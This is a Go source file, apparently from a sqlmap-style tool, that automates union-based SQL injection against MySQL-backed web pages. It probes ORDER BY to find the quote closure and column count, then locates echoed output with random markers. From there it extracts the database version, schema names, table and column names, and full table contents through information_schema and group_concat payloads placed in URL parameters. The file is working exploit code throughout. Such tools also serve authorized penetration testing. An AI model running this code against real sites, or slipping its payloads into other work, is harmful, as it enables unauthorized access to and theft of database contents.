package core

import (
	"bytes"
	"github.com/EmYiQing/go-sqlmap/constant"
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/parse"
	"github.com/EmYiQing/go-sqlmap/util"
	"math/rand"
	"strconv"
	"strings"
	"time"
)

// GetOrderByNum 用Order By语句检测出真正的闭合符号并得到列数
func GetOrderByNum(fixUrl parse.BaseUrl, key string, suffixList []string) (string, int) {
	temp := fixUrl.Params[key]
	for i := 1; ; i++ {
		for _, suffix := range suffixList {
			// 一般表的字段数不可能超过100个
			if i > 100 {
				fixUrl.SetParam(key, temp)
				return "", 0
			}
			fixUrl.SetParam(key, temp+suffix+constant.Space+constant.UnionSelectOrderPayload+
				constant.Space+strconv.Itoa(i)+constant.Space+constant.Annotator)
			resp := fixUrl.SendRequestByBaseUrl()
			if resp.Code != -1 {
				// 得到最终正确的闭合符号
				if strings.Contains(strings.ToLower(string(resp.Body)),
					strings.ToLower(constant.OrderKeyword)) {
					fixUrl.SetParam(key, temp)
					return suffix, i
				}
			}
		}
	}
}

// GetUnionSelectPos 根据得到的列数得到页面回显索引
func GetUnionSelectPos(suffix string, fixUrl parse.BaseUrl, paramKey string, key int) Pos {
	temp := fixUrl.Params[paramKey]
	unionSql := bytes.Buffer{}
	unionSql.WriteString(temp + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	// 设置随机数（唯一ID）
	// randMap是UnionSelect序号和随机数的对应关系
	// 为了后续可以根据回显随机数确认需要并替换为Payload
	randMap := make(map[int]int)
	for i := 1; i < key; i++ {
		// 每次根据当前时间生成，确保唯一
		rand.Seed(time.Now().UnixNano())
		x := rand.Intn(constant.DefaultRandomRange)
		randMap[i] = x
		unionSql.WriteString(strconv.Itoa(x) + ",")
	}
	res := util.DeleteLastChar(unionSql.String())
	unionPayload := res + constant.Space + constant.Annotator
	fixUrl.SetParam(paramKey, unionPayload)
	resp := fixUrl.SendRequestByBaseUrl()
	pos := Pos{}
	var tempPosList []Pos
	if resp.Code != -1 {
		body := string(resp.Body)
		for k, v := range randMap {
			if !strings.Contains(body, strconv.Itoa(v)) {
				continue
			}
			// 保存随机数在页面中的索引
			index := strings.Index(body, strconv.Itoa(v))
			if index != -1 {
				tempPos := Pos{}
				tempPos.Key = k
				tempPos.StartIndex = index
				endIndex := index + len(strconv.Itoa(v))
				// 得到随机数之后的第一个字符，为了后续的分割
				tempPos.EndIndexChar = util.GetIndexChar(body, endIndex)
				tempPosList = append(tempPosList, tempPos)
			}
		}
		// 可能找到多处回显，确保最终返回的是第一处回显
		min := GetMinPos(tempPosList)
		fixUrl.SetParam(paramKey, temp)
		return min
	}
	fixUrl.SetParam(paramKey, temp)
	return pos
}

// GetVersion 根据已有的条件得到数据库版本信息
func GetVersion(pos Pos, suffix string, fixUrl parse.BaseUrl, paramKey string, key int) string {
	temp := fixUrl.Params[paramKey]
	versionSql := bytes.Buffer{}
	versionSql.WriteString(temp + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		versionSql.WriteString(constant.VersionFunc + ",")
	}
	res := util.DeleteLastChar(versionSql.String())
	versionPayload := res + constant.Space + constant.Annotator
	fixUrl.SetParam(paramKey, versionPayload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		// 获得随机数开始索引处往后的部分
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		// 根据随机数之后的第一个字符分割得到数据
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("mysql version:" + result)
		fixUrl.SetParam(paramKey, temp)
		return result
	}
	fixUrl.SetParam(paramKey, temp)
	return ""
}

// GetCurrentDatabase 根据已有的条件得到当前数据库名
func GetCurrentDatabase(pos Pos, suffix string, fixUrl parse.BaseUrl, paramKey string, key int) string {
	temp := fixUrl.Params[paramKey]
	databaseSql := bytes.Buffer{}
	databaseSql.WriteString(temp + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		databaseSql.WriteString(constant.DatabaseFunc + ",")
	}
	res := util.DeleteLastChar(databaseSql.String())
	databasePayload := res + constant.Space + constant.Annotator
	fixUrl.SetParam(paramKey, databasePayload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		// 获得随机数开始索引处往后的部分
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		// 根据随机数之后的第一个字符分割得到数据
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("current database:" + result)
		fixUrl.SetParam(paramKey, temp)
		return result
	}
	fixUrl.SetParam(paramKey, temp)
	return ""
}

// GetAllDatabases 根据已有的信息得到所有的数据库名
func GetAllDatabases(pos Pos, suffix string, fixUrl parse.BaseUrl, paramKey string, key int) string {
	temp := fixUrl.Params[paramKey]
	database := constant.UnionSelectUnionSql
	databaseSql := bytes.Buffer{}
	databaseSql.WriteString(temp + suffix + constant.Space + database + constant.Space)
	for i := 1; i < key; i++ {
		databaseSql.WriteString("group_concat(schema_name),")
	}
	res := util.DeleteLastChar(databaseSql.String())
	fromSql := "from%20information_schema.schemata%20"
	tablePayload := res + constant.Space + fromSql + constant.Annotator
	fixUrl.SetParam(paramKey, tablePayload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		// 获得随机数开始索引处往后的部分
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		// 根据随机数之后的第一个字符分割得到数据
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get databases success")
		util.PrintDatabases(util.ConvertString(result))
		fixUrl.SetParam(paramKey, temp)
		return result
	}
	fixUrl.SetParam(paramKey, temp)
	return ""
}

// GetAllTables 根据已有的信息得到某数据库中所有的表
func GetAllTables(pos Pos, suffix string, fixUrl parse.BaseUrl, paramKey string, key int, database string) string {
	temp := fixUrl.Params[paramKey]
	tableSql := bytes.Buffer{}
	tableSql.WriteString(temp + suffix + constant.Space + constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		tableSql.WriteString("group_concat(table_name),")
	}
	res := util.DeleteLastChar(tableSql.String())
	fromSql := "from%20information_schema.tables%20where%20table_schema='" + database + "'%20"
	tablePayload := res + constant.Space + fromSql + constant.Annotator
	fixUrl.SetParam(paramKey, tablePayload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		// 获得随机数开始索引处往后的部分
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		// 根据随机数之后的第一个字符分割得到数据
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get tables success")
		util.PrintTables(util.ConvertString(result))
		fixUrl.SetParam(paramKey, temp)
		return result
	}
	fixUrl.SetParam(paramKey, temp)
	return ""
}

// GetColumns 根据已有的信息得到某表中的所有字段名
func GetColumns(pos Pos, suffix string, fixUrl parse.BaseUrl, paramKey string,
	key int, database string, tableName string) string {
	temp := fixUrl.Params[paramKey]
	columnSql := bytes.Buffer{}
	columnSql.WriteString(temp + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		columnSql.WriteString("group_concat(column_name),")
	}
	res := util.DeleteLastChar(columnSql.String())
	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
		"'%20and%20table_schema='" + database + "'%20"
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	fixUrl.SetParam(paramKey, columnPayload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		// 获得随机数开始索引处往后的部分
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		// 根据随机数之后的第一个字符分割得到数据
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get columns success")
		util.PrintColumns(util.ConvertString(result))
		fixUrl.SetParam(paramKey, temp)
		return result
	}
	fixUrl.SetParam(paramKey, temp)
	return ""
}

// GetData 根据已有的信息得到某表所有数据
func GetData(pos Pos, suffix string, fixUrl parse.BaseUrl, paramKey string, key int,
	database string, tableName string, columns []string) {
	temp := fixUrl.Params[paramKey]
	dataSql := bytes.Buffer{}
	dataSql.WriteString(temp + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		prefix := "group_concat("
		for _, v := range columns {
			prefix = prefix + v + ",0x3a,"
		}
		// 去除字符串末尾六位，为了不在for循环内部再判断
		innerR := []rune(prefix)
		innerRes := string(innerR[:len(innerR)-6])
		dataSql.WriteString(innerRes + "),")
	}
	res := util.DeleteLastChar(dataSql.String())
	fromSql := "from%20" + database + "." + tableName
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	fixUrl.SetParam(paramKey, columnPayload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		// 获得随机数开始索引处往后的部分
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		// 根据随机数之后的第一个字符分割得到数据
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get data success")
		// 字符串数组转接口数据后才能动态printf规范输出
		var output [][]string
		for _, v := range strings.Split(result, ",") {
			var innerTemp []string
			params := strings.Split(v, ":")
			for _, innerV := range params {
				innerTemp = append(innerTemp, innerV)
			}
			output = append(output, innerTemp)
		}
		util.PrintData(util.ConvertInterfaceArray(columns, output))
	}
	fixUrl.SetParam(paramKey, temp)
}
